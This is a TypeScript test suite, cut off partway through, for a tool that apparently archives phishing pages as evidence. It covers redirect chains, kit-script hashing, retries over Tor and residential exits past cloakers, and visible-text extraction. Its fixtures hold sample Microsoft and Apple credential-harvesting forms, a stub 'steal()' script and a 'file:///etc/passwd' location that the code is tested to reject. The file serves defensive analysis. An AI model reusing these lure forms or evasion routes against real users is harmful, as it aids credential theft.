import { describe, expect, test } from "bun:test";
import { createHash } from "node:crypto";
import { homedir } from "node:os";
import puppeteer, { type Browser, type BrowserContext, type HTTPRequest, type HTTPResponse, type Page, TimeoutError } from "rebrowser-puppeteer-core";
import sharp from "sharp";
import type { FabricEgress } from "./browser/fabric";
import { IPHONE_USER_AGENT } from "./browser/page";
import type { WebsiteDataEntryField, WebsiteNavigationHop, WebsitePageAction } from "./website_types";

import { type WebsiteArchiveResult, archiveWebsite, BrowserInfrastructureError, capturedDocumentContent, getMhtmlArchiveDate, getMhtmlArchiveLocation, isBrowserInfrastructureFailure, WebsiteCaptureFailedError } from "./website_archive";

function mhtml(preamble: string, body = "content") {
	return Buffer.from(`${preamble}\r\n\r\n${body}`, "latin1");
}

describe("getMhtmlArchiveDate", () => {
	test("reads the top-level capture date", () => {
		const date = getMhtmlArchiveDate(
			mhtml(
				["From: <Saved by Blink>", "Snapshot-Content-Location: https://example.test/", "Date: Tue, 13 Jan 2026 14:50:56 +0100"].join(
					"\r\n",
				),
			),
		);

		expect(date?.toISOString()).toBe("2026-01-13T13:50:56.000Z");
	});

	test("folds continuation lines and ignores dates inside MIME parts", () => {
		const date = getMhtmlArchiveDate(
			mhtml(
				["From: <Saved by Blink>", "Date:", "\tTue, 13 Jan 2026 14:50:56 +0100"].join("\r\n"),
				"Date: Wed, 14 Jan 2026 14:50:56 +0100",
			),
		);

		expect(date?.toISOString()).toBe("2026-01-13T13:50:56.000Z");
	});

	test("accepts LF-only MHTML headers", () => {
		const date = getMhtmlArchiveDate(Buffer.from("Date: Tue, 13 Jan 2026 14:50:56 +0100\n\ncontent", "latin1"));

		expect(date?.toISOString()).toBe("2026-01-13T13:50:56.000Z");
	});

	test("returns undefined when the capture date is absent or invalid", () => {
		expect(getMhtmlArchiveDate(mhtml("From: <Saved by Blink>"))).toBeUndefined();
		expect(getMhtmlArchiveDate(mhtml("Date: not a date"))).toBeUndefined();
	});

	test("reads the top-level document URL, not a MIME part URL", () => {
		const snapshot = Buffer.from([
			"From: <Saved by Blink>",
			"Snapshot-Content-Location: https://final.example/landing",
			"",
			"Content-Location: https://embedded.example/",
		].join("\r\n"), "latin1");
		expect(getMhtmlArchiveLocation(snapshot)).toBe("https://final.example/landing");
		expect(getMhtmlArchiveLocation(mhtml("Snapshot-Content-Location: file:///etc/passwd"))).toBeUndefined();
	});
});

test("archiveWebsite parses a retained MHTML snapshot locally without opening a browser", async () => {
	const snapshot = Buffer.from([
		"From: <Saved by Blink>",
		"Content-Type: multipart/related; boundary=\"fabric-test\"",
		"",
		"--fabric-test",
		"Content-Type: text/html",
		"Content-Location: https://example.test/",
		"",
		"<html><head><title>Captured</title></head><body><p>Captured evidence</p><script>not-run()</script></body></html>",
		"--fabric-test--",
	].join("\r\n"), "utf8");

	const archive = await archiveWebsite({ url: "https://example.test/", mhtmlSnapshot: snapshot });
	expect(archive.html.toString()).toContain("Captured");
	expect(archive.text.toString()).toContain("Captured evidence");
	expect(archive.html.toString()).not.toContain("not-run");
	expect(archive.screenshotPng).toBeUndefined();
});

// The fake document draws no frames, hidden or not.
const mainFrame = { childFrames: () => [] };
/** Live captures in tests wait only briefly for a page's own script navigation. */
const fast = { scriptNavigationSettleMs: 20 } as const;

function responseForNavigation(
	url: string,
	status: number,
	options: { location?: string; contentType?: string; redirects?: Array<{ url: string; status: number; location?: string }> } = {},
): HTTPResponse {
	const response = (hopUrl: string, hopStatus: number, headers: Record<string, string>, redirects: HTTPRequest[]): HTTPResponse => {
		let hopResponse: HTTPResponse;
		const request = {
			url: () => hopUrl,
			response: () => hopResponse,
			redirectChain: () => redirects,
			isNavigationRequest: () => true,
			resourceType: () => "document",
			frame: () => mainFrame,
		} as unknown as HTTPRequest;
		hopResponse = {
			ok: () => hopStatus >= 200 && hopStatus < 300,
			status: () => hopStatus,
			url: () => hopUrl,
			headers: () => headers,
			request: () => request,
		} as HTTPResponse;
		return hopResponse;
	};
	const redirects = options.redirects ?? [];
	const priorRequests: HTTPRequest[] = [];
	for (const redirect of redirects) {
		const redirectResponse = response(redirect.url, redirect.status, {
			...(redirect.location ? { location: redirect.location } : {}),
			"content-type": "text/html",
		}, priorRequests.slice());
		const redirectRequest = {
			url: () => redirect.url,
			response: () => redirectResponse,
			redirectChain: () => priorRequests.slice(),
		} as unknown as HTTPRequest;
		priorRequests.push(redirectRequest);
	}
	return response(url, status, {
		...(options.location ? { location: options.location } : {}),
		...(options.contentType ? { "content-type": options.contentType } : {}),
	}, priorRequests) as HTTPResponse;
}

type FixtureNavigation = {
	url: string;
	egress: FabricEgress;
	/** Deliver a later main-frame document response, as a self-replacing interstitial does. */
	replaceDocument: (response: HTTPResponse) => void;
	/** Deliver a subresource response (script, stylesheet, image) the page loaded. */
	loadResource: (response: HTTPResponse) => void;
};

/** A non-navigation subresource response with a body. */
function subresource(url: string, resourceType: string, body: string | Error, options: { status?: number; contentType?: string } = {}): HTTPResponse {
	const request = {
		url: () => url,
		isNavigationRequest: () => false,
		resourceType: () => resourceType,
		frame: () => mainFrame,
		redirectChain: () => [],
	} as unknown as HTTPRequest;
	return {
		ok: () => (options.status ?? 200) < 300,
		status: () => options.status ?? 200,
		url: () => url,
		headers: () => (options.contentType ? { "content-type": options.contentType } : {}),
		request: () => request,
		buffer: async () => {
			if (body instanceof Error) throw body;
			return Buffer.from(body);
		},
	} as unknown as HTTPResponse;
}

/** A page with something drawn on it, and one Chromium had not painted yet. */
const PAINTED_PNG = await sharp({ create: { width: 64, height: 48, channels: 3, background: "#ffffff" } })
	.composite([{ input: { create: { width: 32, height: 12, channels: 3, background: "#202124" } }, top: 18, left: 16 }])
	.png().toBuffer();
const BLANK_PNG = await sharp({ create: { width: 64, height: 48, channels: 3, background: "#ffffff" } }).png().toBuffer();

function archiveBrowserFixture(options: {
	goto?: (navigation: FixtureNavigation) => Promise<HTTPResponse | null>;
	/** How the page's network goes idle; may render the document's body meanwhile. */
	networkIdle?: (wait: { timeout?: number; render: (body: string) => void }) => Promise<void>;
	pageUrl?: string;
	/** Screenshots served in order; the last repeats. Defaults to a painted page. */
	screenshots?: Buffer[];
} = {}) {
	const eventNames: string[] = [];
	const navigationCalls: Array<{ url: string; egress: FabricEgress; waitUntil?: string; timeout?: number; referer?: string }> = [];
	const networkIdleWaits: Array<{ idleTime?: number; concurrency?: number; timeout?: number }> = [];
	const leasedEgress: FabricEgress[] = [];
	let interceptionEnabled = false;
	let screenshotCount = 0;
	let closeCount = 0;
	let captureSnapshotCount = 0;

	const getBrowser = async (egress: FabricEgress = "phishing") => {
		leasedEgress.push(egress);
		const responseListeners: Array<(response: HTTPResponse) => void> = [];
		let currentUrl = options.pageUrl ?? "https://example.test/";
		let body = "Captured page text";
		const context = {} as BrowserContext;
		const page = {
			browser: () => browser,
			browserContext: () => context,
			mainFrame: () => mainFrame,
			// The fake document draws no frame a verification gate could sit in.
			frames: () => [],
			createCDPSession: async () => ({ send: async (method: string) => (method === "Browser.getWindowForTarget" ? { windowId: 1 } : {}) }),
			on: (event: string, listener: (response: HTTPResponse) => void) => {
				eventNames.push(event);
				if (event === "response") responseListeners.push(listener);
			},
			setRequestInterception: async (enabled: boolean) => { interceptionEnabled = enabled; },
			setUserAgent: async () => undefined,
			evaluateOnNewDocument: async () => ({ identifier: "1" }),
			goto: async (url: string, navigation: { waitUntil?: string; timeout?: number; referer?: string }) => {
				navigationCalls.push({ url, egress, ...navigation });
				const deliver = (response: HTTPResponse) => {
					currentUrl = response.url();
					for (const listener of responseListeners) listener(response);
				};
				const loadResource = (response: HTTPResponse) => {
					for (const listener of responseListeners) listener(response);
				};
				const response = options.goto
					? await options.goto({ url, egress, replaceDocument: deliver, loadResource })
					: responseForNavigation(options.pageUrl ?? url, 200, { contentType: "text/html" });
				if (response) deliver(response);
				return response;
			},
			waitForNetworkIdle: async (wait: { idleTime?: number; concurrency?: number; timeout?: number }) => {
				networkIdleWaits.push(wait);
				await options.networkIdle?.({ timeout: wait.timeout, render: (html) => { body = html; } });
			},
			screenshot: async () => {
				const shots = options.screenshots ?? [PAINTED_PNG];
				return shots[Math.min(screenshotCount++, shots.length - 1)]!;
			},
			target: () => ({
				createCDPSession: async () => ({
					send: async (method: string) => {
						if (method !== "Page.captureSnapshot") throw new Error(`Unexpected CDP command ${method}`);
						captureSnapshotCount++;
						return {
							data: [
								"From: <Saved by Blink>",
								`Snapshot-Content-Location: ${currentUrl}`,
								"Content-Type: multipart/related; boundary=\"archive-test\"",
								"",
								"--archive-test",
								"Content-Type: text/html",
								`Content-Location: ${currentUrl}`,
								"",
								`<html><head><title>Captured title</title></head><body>${body}</body></html>`,
								"--archive-test--",
							].join("\r\n"),
						};
					},
				}),
			}),
			evaluate: async (callback: () => unknown) => {
				const source = callback.toString();
				if (source.includes("readyState")) return "interactive";
				// The blank-screenshot retry asks whether the page shows text, then waits for a frame.
				if (source.includes("innerText")) return body.trim().length > 0;
				if (source.includes("requestAnimationFrame")) return undefined;
				throw new Error("Unexpected page evaluation");
			},
			title: async () => "Just a moment...",
			url: () => currentUrl,
		};
		const browser = {
			defaultBrowserContext: () => ({ ...context, newPage: async () => page }),
			version: async () => "Chrome/156.0.8078.73",
			close: async () => { closeCount++; },
		} as unknown as Browser;
		return browser;
	};

	return {
		getBrowser,
		eventNames,
		navigationCalls,
		networkIdleWaits,
		leasedEgress,
		get interceptionEnabled() { return interceptionEnabled; },
		get screenshotCount() { return screenshotCount; },
		get closeCount() { return closeCount; },
		get captureSnapshotCount() { return captureSnapshotCount; },
	};
}

test("a live capture records the hashes of every host's scripts and stylesheets as received", async () => {
	const url = "https://kit.example.com/signin";
	const script = "window.kit = " + "1;".repeat(600);
	const style = "body{" + "color:#123456;".repeat(100) + "}";
	const fixture = archiveBrowserFixture({
		goto: async ({ loadResource }) => {
			loadResource(subresource("https://kit.example.com/index.js?v=2", "script", script, { contentType: "application/javascript; charset=utf-8" }));
			loadResource(subresource("https://kit.example.com/res/style.css", "stylesheet", style, { contentType: "text/css" }));
			// The same script under a second URL is recorded once.
			loadResource(subresource("https://kit.example.com/index.js?v=3", "script", script, { contentType: "application/javascript" }));
			// A loader kit's code on its backend host is kept like the page's own.
			loadResource(subresource("https://backend.example.net/gmail/js/start.js", "script", "start", { contentType: "application/javascript" }));
			// Images, failed responses and unreadable bodies are not kit evidence.
			loadResource(subresource("https://kit.example.com/logo.png", "image", "png-bytes", { contentType: "image/png" }));
			loadResource(subresource("https://kit.example.com/missing.js", "script", "not found", { status: 404, contentType: "text/html" }));
			loadResource(subresource("https://kit.example.com/evicted.js", "script", new Error("No resource with given identifier found")));
			return responseForNavigation(url, 200, { contentType: "text/html" });
		},
	});
	const archive = await archiveWebsite({ url }, { getBrowser: fixture.getBrowser, ...fast });
	const sha256 = (value: string) => createHash("sha256").update(value).digest("hex");
	expect(archive.kitResources).toEqual([
		{ url: "https://kit.example.com/index.js?v=2", mimeType: "application/javascript", size: Buffer.byteLength(script), sha256: sha256(script) },
		{ url: "https://kit.example.com/res/style.css", mimeType: "text/css", size: Buffer.byteLength(style), sha256: sha256(style) },
		{ url: "https://backend.example.net/gmail/js/start.js", mimeType: "application/javascript", size: 5, sha256: sha256("start") },
	]);
});

test("a followed link is opened with the page that showed it as the Referer, on every route", async () => {
	const url = "https://kit.example.com/secure.html";
	const referrer = "https://kit.example.com/Access.html";
	const fixture = archiveBrowserFixture({
		goto: async ({ url: requested, egress }) => {
			if (egress !== "residential") throw new Error(`net::ERR_CONNECTION_CLOSED at ${requested}`);
			return responseForNavigation(requested, 200, { contentType: "text/html" });
		},
	});
	const archive = await archiveWebsite({ url, referrer }, { getBrowser: fixture.getBrowser, ...fast });

	expect(archive.url).toBe(url);
	expect(fixture.navigationCalls.map(({ egress, referer }) => ({ egress, referer }))).toEqual([
		{ egress: "phishing", referer: referrer },
		{ egress: "reporting", referer: referrer },
		{ egress: "residential", referer: referrer },
	]);
});

test("website capture records every redirect response separately from the final page evidence", async () => {
	const requestedUrl = "https://share.google/ZAq2FghpGquJH6ShL";
	const googleUrl = "https://www.google.com/share.google?q=ZAq2FghpGquJH6ShL";
	const workerUrl = "https://dark-haze-3505.silo1.workers.dev/";
	const destinationUrl = "https://fuckyou.gay/";
	const fixture = archiveBrowserFixture({
		pageUrl: destinationUrl,
		goto: async () => responseForNavigation(destinationUrl, 200, {
			contentType: "text/html; charset=UTF-8",
			redirects: [
				{ url: requestedUrl, status: 302, location: googleUrl },
				{ url: googleUrl, status: 301, location: workerUrl },
				{ url: workerUrl, status: 302, location: destinationUrl },
			],
		}),
	});
	const archive = await archiveWebsite(
		{ url: requestedUrl },
		{ ...fast, getBrowser: fixture.getBrowser },
	);

	expect(fixture.navigationCalls).toEqual([{ url: requestedUrl, egress: "phishing", waitUntil: "domcontentloaded", timeout: 30_000 }]);
	expect(fixture.leasedEgress).toEqual(["phishing"]);
	// Requests are only observed (a hidden frame's uploads), never intercepted.
	expect(fixture.interceptionEnabled).toBe(false);
	expect(archive.requestedUrl).toBe(requestedUrl);
	expect(archive.url).toBe(destinationUrl);
	expect(archive.hostname).toBe("fuckyou.gay");
	expect(archive.navigationHops).toEqual([
		{ index: 0, url: requestedUrl, hostname: "share.google", status: 302, redirectTo: googleUrl, contentType: "text/html", contentCaptured: false },
		{ index: 1, url: googleUrl, hostname: "www.google.com", status: 301, redirectTo: workerUrl, contentType: "text/html", contentCaptured: false },
		{ index: 2, url: workerUrl, hostname: "dark-haze-3505.silo1.workers.dev", status: 302, redirectTo: destinationUrl, contentType: "text/html", contentCaptured: false },
		{ index: 3, url: destinationUrl, hostname: "fuckyou.gay", status: 200, contentType: "text/html; charset=UTF-8", contentCaptured: true },
	]);
	expect(fixture.captureSnapshotCount).toBe(1);
	expect(fixture.screenshotCount).toBe(1);
	expect(fixture.closeCount).toBe(1);
	expect(archive.text.toString()).toContain("Captured page text");
});

test("a blank screenshot of a page that shows text is taken again once the page has painted", async () => {
	const fixture = archiveBrowserFixture({ screenshots: [BLANK_PNG, BLANK_PNG, PAINTED_PNG] });

	const archive = await archiveWebsite({ url: "https://example.test/" }, { ...fast, getBrowser: fixture.getBrowser });

	expect(fixture.screenshotCount).toBe(3);
	expect(archive.screenshotPng?.equals(PAINTED_PNG)).toBeTrue();
	expect(archive.route).toBe("Tor exit");
});

test("a page that stays blank is captured blank after a bounded number of attempts", async () => {
	const fixture = archiveBrowserFixture({ screenshots: [BLANK_PNG] });

	const archive = await archiveWebsite({ url: "https://example.test/" }, { ...fast, getBrowser: fixture.getBrowser });

	expect(fixture.screenshotCount).toBe(4);
	expect(archive.screenshotPng?.equals(BLANK_PNG)).toBeTrue();
});

test("a navigation failure over Tor is retried from the server's direct exit", async () => {
	const url = "https://www8-receitafazendagerador.com/Aplicacao/Mei/pgmei.app";
	const fixture = archiveBrowserFixture({
		pageUrl: url,
		goto: async ({ egress }) => {
			if (egress === "phishing") throw new Error(`net::ERR_TIMED_OUT at ${url}`);
			return responseForNavigation(url, 200, { contentType: "text/html" });
		},
	});

	const archive = await archiveWebsite({ url }, { ...fast, getBrowser: fixture.getBrowser });

	expect(fixture.leasedEgress).toEqual(["phishing", "reporting"]);
	expect(fixture.closeCount).toBe(2);
	expect(fixture.captureSnapshotCount).toBe(1);
	expect(archive.url).toBe(url);
});

test("website capture reports the navigation failure of every egress, including the residential exit, and closes each lease", async () => {
	const fixture = archiveBrowserFixture({
		goto: async () => { throw new Error("Navigation timeout of 30000 ms exceeded"); },
	});

	await expect(archiveWebsite(
		{ url: "https://example.test/" },
		{ ...fast, getBrowser: fixture.getBrowser },
	)).rejects.toThrow("Failed to load page: Navigation timeout of 30000 ms exceeded via Tor exit; Navigation timeout of 30000 ms exceeded via server IP; Navigation timeout of 30000 ms exceeded via residential exit");
	expect(fixture.leasedEgress).toEqual(["phishing", "reporting", "residential"]);
	expect(fixture.screenshotCount).toBe(0);
	expect(fixture.captureSnapshotCount).toBe(0);
	expect(fixture.closeCount).toBe(3);
});

test("a failure after the page loaded is not retried on another egress", async () => {
	const fixture = archiveBrowserFixture();
	const getBrowser: typeof fixture.getBrowser = async (egress) => {
		const browser = await fixture.getBrowser(egress);
		const context = browser.defaultBrowserContext();
		const newPage = context.newPage.bind(context);
		context.newPage = async () => Object.assign(await newPage(), { screenshot: async () => { throw new Error("Protocol error (Page.captureScreenshot)"); } });
		return Object.assign(browser, { defaultBrowserContext: () => context });
	};

	await expect(archiveWebsite({ url: "https://example.test/" }, { ...fast, getBrowser })).rejects.toThrow("Protocol error (Page.captureScreenshot)");
	expect(fixture.leasedEgress).toEqual(["phishing"]);
	expect(fixture.closeCount).toBe(1);
});

test("browser-service failures are told apart from a site that cannot be reached", async () => {
	const unavailable = archiveBrowserFixture();
	const relayDown = async () => { throw Object.assign(new Event("error"), { message: "Unexpected server response: 503" }); };
	const relayError = await archiveWebsite({ url: "https://example.test/" }, { ...fast, getBrowser: relayDown }).then(() => undefined, (error: unknown) => error);
	expect(relayError).toBeInstanceOf(BrowserInfrastructureError);
	expect((relayError as Error).message).toBe("Browser service unavailable: Unexpected server response: 503");
	expect(isBrowserInfrastructureFailure(relayError)).toBe(true);
	expect(unavailable.leasedEgress).toEqual([]);

	// A browser that closes during navigation is the service's fault, not the site's.
	const closed = archiveBrowserFixture({ goto: async () => { throw new Error("Protocol error (Page.navigate): Target closed"); } });
	const closedError = await archiveWebsite({ url: "https://example.test/" }, { ...fast, getBrowser: closed.getBrowser }).then(() => undefined, (error: unknown) => error);
	expect(isBrowserInfrastructureFailure(closedError)).toBe(true);
	expect(closed.leasedEgress).toEqual(["phishing"]);

	// A site that answers no route is final, even when a route's reason mentions a closed connection.
	const blocked = archiveBrowserFixture({ goto: async () => { throw new Error("net::ERR_CONNECTION_CLOSED at https://example.test/"); } });
	const blockedError = await archiveWebsite({ url: "https://example.test/" }, { ...fast, getBrowser: blocked.getBrowser }).then(() => undefined, (error: unknown) => error);
	expect(blockedError).toBeInstanceOf(WebsiteCaptureFailedError);
	expect(isBrowserInfrastructureFailure(blockedError)).toBe(false);
	expect(blocked.leasedEgress).toEqual(["phishing", "reporting", "residential"]);
});

describe("rendering", () => {
	// A Flazio site builder page: the document is a shell, and the login form
	// arrives through XHR after DOMContentLoaded.
	const url = "https://microsoftoutlook.flazio.online/";
	const form = "<form><h1>Melden Sie sich bei Ihrem Microsoft-Konto an</h1><input type=\"email\" placeholder=\"E-Mail-Adresse\"><input type=\"password\" placeholder=\"Passwort\"></form>";

	test("waits for the page's own requests to finish so the capture holds the form they render", async () => {
		const fixture = archiveBrowserFixture({
			pageUrl: url,
			networkIdle: async ({ render }) => {
				await Bun.sleep(5);
				render(form);
			},
		});

		const archive = await archiveWebsite({ url }, { ...fast, getBrowser: fixture.getBrowser });

		expect(archive.text.toString()).toContain("Melden Sie sich bei Ihrem Microsoft-Konto an");
		expect(archive.text.toString()).toContain("E-Mail-Adresse");
		expect(archive.text.toString()).toContain("Passwort");
		expect(fixture.networkIdleWaits).toEqual([{ idleTime: 1_000, concurrency: 2, timeout: 10_000 }]);
	});

	test("a page that never goes quiet is captured as it stands once the bound passes", async () => {
		const fixture = archiveBrowserFixture({
			pageUrl: url,
			networkIdle: async ({ timeout, render }) => {
				render(form);
				await Bun.sleep(timeout ?? 0);
				throw new TimeoutError(`Timed out after waiting ${timeout}ms`);
			},
		});

		const archive = await archiveWebsite({ url }, { ...fast, renderSettleMs: 20, getBrowser: fixture.getBrowser });

		expect(archive.text.toString()).toContain("E-Mail-Adresse");
		expect(fixture.networkIdleWaits).toEqual([{ idleTime: 20, concurrency: 2, timeout: 20 }]);
		expect(fixture.leasedEgress).toEqual(["phishing"]);
		expect(fixture.screenshotCount).toBe(1);
	});

	test("a browser failure while waiting is not mistaken for a slow page", async () => {
		const fixture = archiveBrowserFixture({
			pageUrl: url,
			networkIdle: async () => { throw new Error("Protocol error: Target closed"); },
		});

		await expect(archiveWebsite({ url }, { ...fast, getBrowser: fixture.getBrowser })).rejects.toThrow("Target closed");
		expect(fixture.leasedEgress).toEqual(["phishing"]);
		expect(fixture.screenshotCount).toBe(0);
		expect(fixture.closeCount).toBe(1);
	});

	test("waits on the document a cloaker's script navigated to, not on the interstitial", async () => {
		const interstitial = "https://interstitial.example/";
		const events: string[] = [];
		const fixture = archiveBrowserFixture({
			pageUrl: interstitial,
			goto: async ({ replaceDocument }) => {
				setTimeout(() => {
					events.push("script navigation");
					replaceDocument(responseForNavigation("https://interstitial.example/login", 200, { contentType: "text/html" }));
				}, 5);
				return responseForNavigation(interstitial, 200, { contentType: "text/html" });
			},
			networkIdle: async ({ render }) => {
				events.push("render");
				render(form);
			},
		});

		const archive = await archiveWebsite({ url: interstitial }, { scriptNavigationSettleMs: 1_100, getBrowser: fixture.getBrowser });

		expect(events).toEqual(["script navigation", "render"]);
		expect(archive.url).toBe("https://interstitial.example/login");
		expect(archive.text.toString()).toContain("E-Mail-Adresse");
	});
});

test("an HTTP error over Tor is retried from the server's direct exit", async () => {
	const url = "https://xfinityy111.weebly.com/";
	const fixture = archiveBrowserFixture({
		pageUrl: url,
		goto: async ({ egress }) => responseForNavigation(url, egress === "phishing" ? 403 : 200, { contentType: "text/html" }),
	});

	const archive = await archiveWebsite({ url }, { ...fast, getBrowser: fixture.getBrowser, errorDocumentSettleMs: 20 });

	expect(fixture.leasedEgress).toEqual(["phishing", "reporting"]);
	expect(fixture.closeCount).toBe(2);
	expect(fixture.captureSnapshotCount).toBe(1);
	expect(archive.url).toBe(url);
	expect(archive.navigationHops).toEqual([
		{ index: 0, url, hostname: "xfinityy111.weebly.com", status: 200, contentType: "text/html", contentCaptured: true },
	]);
});

test("a bot-check interstitial that reloads into the real page is captured with the real page's response", async () => {
	const url = "https://www8-receitafazendagerador.com/Aplicacao/Mei/pgmei.app";
	const realUrl = `${url}/`;
	const fixture = archiveBrowserFixture({
		pageUrl: url,
		goto: async ({ replaceDocument }) => {
			setTimeout(() => replaceDocument(responseForNavigation(realUrl, 200, {
				contentType: "text/html; charset=UTF-8",
				redirects: [{ url, status: 301, location: realUrl }],
			})), 30);
			return responseForNavigation(url, 403, { contentType: "text/html" });
		},
	});

	const archive = await archiveWebsite({ url }, { ...fast, getBrowser: fixture.getBrowser, errorDocumentSettleMs: 2_000 });

	expect(fixture.leasedEgress).toEqual(["phishing"]);
	expect(fixture.captureSnapshotCount).toBe(1);
	expect(archive.url).toBe(realUrl);
	expect(archive.navigationHops).toEqual([
		{ index: 0, url, hostname: "www8-receitafazendagerador.com", status: 301, redirectTo: realUrl, contentType: "text/html", contentCaptured: false },
		{ index: 1, url: realUrl, hostname: "www8-receitafazendagerador.com", status: 200, contentType: "text/html; charset=UTF-8", contentCaptured: true },
	]);
});

test("an HTTP error on every egress fails with each route's status and page title", async () => {
	const url = "https://blocked.example/";
	const fixture = archiveBrowserFixture({
		pageUrl: url,
		goto: async ({ egress }) => responseForNavigation(url, egress === "phishing" ? 403 : 503, { contentType: "text/html" }),
	});

	await expect(archiveWebsite({ url }, { ...fast, getBrowser: fixture.getBrowser, errorDocumentSettleMs: 20 })).rejects.toThrow(
		'Failed to load page: HTTP 403 ("Just a moment...") via Tor exit; HTTP 503 ("Just a moment...") via server IP; HTTP 503 ("Just a moment...") via residential exit',
	);
	expect(fixture.leasedEgress).toEqual(["phishing", "reporting", "residential"]);
	expect(fixture.captureSnapshotCount).toBe(0);
	expect(fixture.closeCount).toBe(3);
});


test("retrying retained MHTML preserves the submitted URL and exact captured-hop provenance", async () => {
	const requestedUrl = "https://share.google/ZAq2FghpGquJH6ShL";
	const finalUrl = "https://fuckyou.gay/";
	const navigationHops: WebsiteNavigationHop[] = [
		{ index: 0, url: requestedUrl, hostname: "share.google", status: 302, redirectTo: "https://www.google.com/", contentCaptured: false },
		{ index: 1, url: finalUrl, hostname: "fuckyou.gay", status: 200, contentCaptured: true },
	];
	const snapshot = Buffer.from([
		"From: <Saved by Blink>",
		`Content-Type: multipart/related; boundary="fabric-test"`,
		"",
		"--fabric-test",
		"Content-Type: text/html",
		"Content-Location: https://fuckyou.gay/",
		"",
		"<html><body>troll page</body></html>",
		"--fabric-test--",
	].join("\r\n"), "utf8");

	const archive = await archiveWebsite({ url: requestedUrl, archivedUrl: finalUrl, navigationHops, mhtmlSnapshot: snapshot });

	expect(archive.requestedUrl).toBe(requestedUrl);
	expect(archive.url).toBe(finalUrl);
	expect(archive.hostname).toBe("fuckyou.gay");
	expect(archive.navigationHops).toEqual(navigationHops);
	expect(archive.text.toString()).toContain("troll page");
});


test("legacy retained MHTML recovers its captured URL instead of assigning final content to the submitted shortener", async () => {
	const requestedUrl = "https://share.google/ZAq2FghpGquJH6ShL";
	const finalUrl = "https://fuckyou.gay/";
	const snapshot = Buffer.from([
		"From: <Saved by Blink>",
		`Snapshot-Content-Location: ${finalUrl}`,
		"Content-Type: multipart/related; boundary=\"fabric-test\"",
		"",
		"--fabric-test",
		"Content-Type: text/html",
		`Content-Location: ${finalUrl}`,
		"",
		"<html><body>troll page</body></html>",
		"--fabric-test--",
	].join("\r\n"), "utf8");

	const archive = await archiveWebsite({ url: requestedUrl, mhtmlSnapshot: snapshot, trustMhtmlDocumentLocation: true });

	expect(archive.requestedUrl).toBe(requestedUrl);
	expect(archive.url).toBe(finalUrl);
	expect(archive.hostname).toBe("fuckyou.gay");
	expect(archive.navigationHops).toEqual([
		{ index: 0, url: requestedUrl, hostname: "share.google", status: null, redirectTo: finalUrl, contentCaptured: false },
		{ index: 1, url: finalUrl, hostname: "fuckyou.gay", status: null, contentCaptured: true },
	]);
	expect(archive.text.toString()).toContain("troll page");
});


test("untrusted submitted MHTML cannot choose the URL associated with captured page evidence", async () => {
	const snapshot = Buffer.from([
		"From: <Saved by Blink>",
		"Snapshot-Content-Location: https://victim.example/login",
		"Content-Type: multipart/related; boundary=\"fabric-test\"",
		"",
		"--fabric-test",
		"Content-Type: text/html",
		"Content-Location: https://victim.example/login",
		"",
		"<html><body>untrusted uploaded snapshot</body></html>",
		"--fabric-test--",
	].join("\r\n"), "utf8");

	const archive = await archiveWebsite({ url: "https://submitter.example/", mhtmlSnapshot: snapshot });

	expect(archive.url).toBe("https://submitter.example/");
	expect(archive.navigationHops).toEqual([{
		index: 0,
		url: "https://submitter.example/",
		hostname: "submitter.example",
		status: null,
		contentCaptured: false,
	}]);
});

test("captured page text includes what visitors read from attributes, but never hidden or entered values", () => {
	const { html, text } = capturedDocumentContent(`<html><head><title>Microsoft</title><script>steal()</script></head><body>
<img src="logo.png" alt="Microsoft logo"><h1>Sign in</h1>
<input type="email" placeholder="Email, phone, or Skype"><input type="password" aria-label="Password">
<input type="hidden" name="token" value="session-secret"><input type="text" name="prefill" value="victim@example.test">
<input type="submit" value="Next"><div contenteditable aria-placeholder="Code"></div>
</body></html>`);

	for (const visible of ["Sign in", "Microsoft logo", "Email, phone, or Skype", "Password", "Next", "Code"]) {
		expect(text.split("\n")).toContain(visible);
	}
	expect(text).not.toContain("session-secret");
	expect(text).not.toContain("victim@example.test");
	expect(html).not.toContain("<script");
	expect(html).not.toContain("<img");
});

test("captured page text keeps attribute captions where a visitor reads them", () => {
	// A kit that labels its fields only with placeholders, quoted by the classifier across heading and fields.
	const { html, text } = capturedDocumentContent(`<html><body><form>
<p><img alt="Microsoft Logo"></p><h1>Iniciar sesión</h1><p>Verificación Microsoft</p>
<input type="email" placeholder="Correo electrónico, teléfono o Skype"><input type="text" placeholder="Contraseña de correo">
<a href="#">¿No puede acceder a su cuenta?</a><button aria-label="Siguiente">Siguiente</button>
</form></body></html>`);

	expect(text).toContain("Microsoft Logo\nIniciar sesión\nVerificación Microsoft\nCorreo electrónico, teléfono o Skype\nContraseña de correo\n¿No puede acceder a su cuenta?");
	// A caption equal to the element's own text is not repeated.
	expect(text.match(/Siguiente/g)).toHaveLength(1);
	expect(html).not.toContain("<img");
	expect(html.match(/Contraseña de correo/g)).toHaveLength(1);
});

test("captured page text leaves out filler a visitor cannot see, which kits use to drown out their form", () => {
	const filler = "Family photos stay in the local archive until the next backup.";
	const { html, text } = capturedDocumentContent(`<!DOCTYPE html><html><body>
<i style="font-size:0!important;opacity:0!important;position:absolute!important">${filler}</i>
<p style="color:transparent; font-size: 0px">${filler}</p><span hidden>${filler}</span><!-- ${filler} -->
<div style="display:none">${filler}</div><div style="visibility: hidden">${filler}</div>
<h1>Sign in with Apple Account</h1><input placeholder="Email or Phone Number">
<p style="opacity:0.5">Forgot password?</p><p style="font-size:0.9em">Keep me signed in</p>
</body></html>`);

	expect(text).toBe("Sign in with Apple Account\nEmail or Phone Number\nForgot password?\nKeep me signed in");
	expect(html).not.toContain(filler);
});

test("captured page text shows each frame's document where the frame stands, however deep, but not hidden frames", () => {
	// How mhtml-to-html leaves a Google Sites page embedding an Apps Script kit: each frame's document in its srcdoc.
	const kit = `<!DOCTYPE html><html><head><title>Security Verification</title></head><body><h1>Sign in</h1><input type="password" aria-label="Password"></body></html>`;
	const sandbox = `<html><body><iframe id="userHtmlFrame" srcdoc="${kit.replaceAll("&", "&amp;").replaceAll('"', "&quot;")}"></iframe></body></html>`;
	const page = `<!DOCTYPE html><html><head><title>Revert apps</title></head><body><h1>Embedded Files</h1>
<iframe aria-label="Apps Script" srcdoc="${sandbox.replaceAll("&", "&amp;").replaceAll('"', "&quot;")}"></iframe>
<iframe hidden srcdoc="<p>tracking pixel frame</p>"></iframe><iframe style="display:none" srcdoc="<p>invisible frame</p>"></iframe>
<p>Page updated</p></body></html>`;

	const { html, text } = capturedDocumentContent(page);

	expect(text).toBe("Revert apps\nRevert apps\nEmbedded Files\nSign in\nPassword\nPage updated");
	expect(html).not.toContain("<iframe");
	expect(html).not.toContain("srcdoc");
